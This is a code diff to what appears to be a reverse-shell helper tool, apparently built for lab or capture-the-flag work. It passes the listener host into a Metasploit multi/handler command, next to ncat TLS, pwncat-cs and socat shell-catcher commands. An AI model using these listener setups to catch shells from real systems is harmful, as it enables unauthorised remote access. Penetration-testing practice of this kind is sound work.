@@ -19,7 +19,7 @@
     { id: 'ncat-ssl', label: 'ncat (TLS)', cmd: function (p) { return 'ncat --ssl -lvn ' + p; }, teach: 'Encrypted catcher; pair with the ncat (TLS) payload so the shell is not plaintext on the wire. In Nmap ncat the listen port is positional (-p is the SOURCE port), so it is -lvn PORT, not -lvnp.', install: 'sudo apt install -y ncat' },
     { id: 'pwncat', label: 'pwncat-cs', cmd: function (p) { return 'pwncat-cs -lp ' + p; }, teach: 'Auto-upgrades to a full PTY, survives drops, and has upload/download built in. The nicest option when installed.', install: 'pipx install pwncat-cs' },
     { id: 'socat', label: 'socat (PTY)', cmd: function (p) { return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + p; }, teach: 'Gives a full PTY directly when the target also has socat. Pair with the socat payload.', install: 'sudo apt install -y socat' },
-    { id: 'msf', label: 'metasploit multi/handler', cmd: function (p) { return 'msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST tun0; set LPORT ' + p + '; set ExitOnSession false; run -j"'; }, teach: 'Use when the payload is a Meterpreter stager; overkill for a plain shell.', install: 'sudo apt install -y metasploit-framework' },
+    { id: 'msf', label: 'metasploit multi/handler', cmd: function (p, h) { return 'msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ' + (h || 'tun0') + '; set LPORT ' + p + '; set ExitOnSession false; run -j"'; }, teach: 'Use when the payload is a Meterpreter stager; overkill for a plain shell.', install: 'sudo apt install -y metasploit-framework' },
   ];
 
   // ── payloads: {{lhost}}/{{lport}} templates, grouped by os ────────────────────────────────────
@@ -179,7 +179,7 @@
     L.push('OBOL_EOF');
     L.push('echo');
     L.push('echo "[*] Listening on :$LPORT  (Ctrl-C to stop)"');
-    if (cat.id === 'msf') L.push(cat.cmd(lport));
+    if (cat.id === 'msf') L.push(cat.cmd(lport, lhost));
     else L.push('exec ' + cat.cmd('"$LPORT"'));
     return L.join('\n') + '\n';
   }
